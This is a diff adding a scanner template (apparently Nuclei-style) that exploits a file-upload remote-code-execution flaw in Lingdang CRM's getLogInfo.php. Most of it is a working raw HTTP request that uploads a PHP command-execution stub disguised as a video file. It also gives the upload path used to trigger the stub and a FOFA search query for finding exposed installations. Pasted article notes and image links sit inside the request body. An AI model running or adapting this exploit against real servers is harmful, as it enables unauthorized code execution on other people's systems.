@@ -1,0 +1,52 @@
+id: poc-gzw1y4gy02eg8kng
+info:
+  name: 灵当CRM getLogInfo.php 文件上传致RCE漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gzw1y4gy02eg8kng'
+  tags: rce,file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: gzw1y4gy02eg8kng
+    fofa: body="crmcommon/js/jquery/jquery-1.10.1.min.js" || body="http://localhost:8088/crm/index.php" && body="ldcrm.base.js" || title="灵当CRM"
+http:
+- raw:
+  - 'POST /crm/WeiXinApp/CallRecordLog/getLogInfo.php?userid=&gettype=uploadfile&uploadfilename=rce.php......&callednumber=&sessionvalue=174761f8ccc469f97f36d33341e231ba HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
+
+    Accept-Encoding: gzip, deflate
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+
+    Accept: */*
+
+    Connection: close
+
+
+    ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+
+    Content-Disposition: form-data; name="uploaded_file"; filename="798.avi"
+
+    Content-Type: image/jpeg
+
+
+    <?php system("whoami");unlink(__FILE__);?>
+
+    ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1751081767138-dd82e24e-9683-49f3-a270-3cdead89100d.png)
+
+    PS：sessionvalue为 uploadfile+上传文件名.php...... 的MD5值
+
+
+    上传定位：GET /crm/storage/mobilecalllog/2025/06/16/rce.php HTTP/1.1
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1751081767305-c8e0c655-f637-4976-b0ad-8e05c1d62034.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
